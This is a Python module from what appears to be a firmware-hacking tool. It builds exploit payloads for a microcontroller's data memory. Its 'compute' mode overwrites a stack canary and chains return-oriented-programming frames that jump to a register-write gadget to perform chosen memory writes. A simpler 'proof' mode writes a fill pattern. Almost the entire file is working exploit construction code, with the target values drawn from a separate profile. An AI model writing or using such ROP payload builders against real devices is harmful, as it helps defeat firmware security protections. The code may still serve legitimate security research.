# SPDX-License-Identifier: GPL-2.0-only

from __future__ import annotations

import hashlib
import struct
from dataclasses import dataclass

from .errors import FirmwareError
from .profile import FirmwareProfile


@dataclass(frozen=True)
class PayloadReport:
    mode: str
    size: int
    sha256: str
    nonzero_bytes: int
    nonzero_dwords: int

    def as_dict(self) -> dict[str, int | str]:
        return {
            "mode": self.mode,
            "size": self.size,
            "sha256": self.sha256,
            "nonzero_bytes": self.nonzero_bytes,
            "nonzero_dwords": self.nonzero_dwords,
        }


def _report(mode: str, payload: bytes) -> PayloadReport:
    nonzero_dwords = sum(
        struct.unpack_from("<I", payload, offset)[0] != 0
        for offset in range(0, len(payload), 4)
    )
    return PayloadReport(
        mode=mode,
        size=len(payload),
        sha256=hashlib.sha256(payload).hexdigest(),
        nonzero_bytes=sum(byte != 0 for byte in payload),
        nonzero_dwords=nonzero_dwords,
    )


def build_proof_payload(profile: FirmwareProfile) -> tuple[bytes, PayloadReport]:
    if profile.payload_size % 4:
        raise FirmwareError("proof payload size must be dword-aligned")
    payload = struct.pack("<I", profile.proof_fill) * (profile.payload_size // 4)
    return payload, _report("proof", payload)


def build_compute_payload(profile: FirmwareProfile) -> tuple[bytes, PayloadReport]:
    payload = bytearray(profile.payload_size)

    def write_dmem(address: int, value: int, field: str) -> None:
        if address % 4:
            raise FirmwareError(f"{field} DMEM address is not dword-aligned")
        offset = address - profile.dma_target
        if offset < 0 or offset + 4 > len(payload):
            raise FirmwareError(f"{field} DMEM write lies outside the payload")
        struct.pack_into("<I", payload, offset, value & 0xFFFFFFFF)

    write_dmem(profile.guard_address, profile.canary_replacement, "guard")
    r0, r1, r2, r3, saved, return_pc = profile.frame_fields
    frame_address = profile.frame_start
    for index, write in enumerate(profile.hs_writes):
        prefix = f"ROP frame {index}"
        write_dmem(frame_address + r0, profile.guard_address, prefix)
        write_dmem(frame_address + r1, 0, prefix)
        write_dmem(frame_address + r2, write.value, prefix)
        write_dmem(frame_address + r3, write.address, prefix)
        write_dmem(frame_address + saved, profile.canary_replacement, prefix)
        write_dmem(frame_address + return_pc, profile.bar0_write_gadget, prefix)
        frame_address += profile.frame_stride

    write_dmem(frame_address + r0, 0, "tail frame")
    write_dmem(frame_address + r1, 0, "tail frame")
    write_dmem(frame_address + r2, 0, "tail frame")
    write_dmem(frame_address + r3, 0, "tail frame")
    write_dmem(frame_address + saved, profile.canary_replacement, "tail frame")
    write_dmem(frame_address + return_pc, profile.tail_return, "tail frame")
    built = bytes(payload)
    return built, _report("compute-community-unverified", built)


def build_payload(profile: FirmwareProfile, mode: str) -> tuple[bytes, PayloadReport]:
    if mode == "proof":
        return build_proof_payload(profile)
    if mode == "compute":
        return build_compute_payload(profile)
    raise FirmwareError(f"unknown payload mode: {mode}")

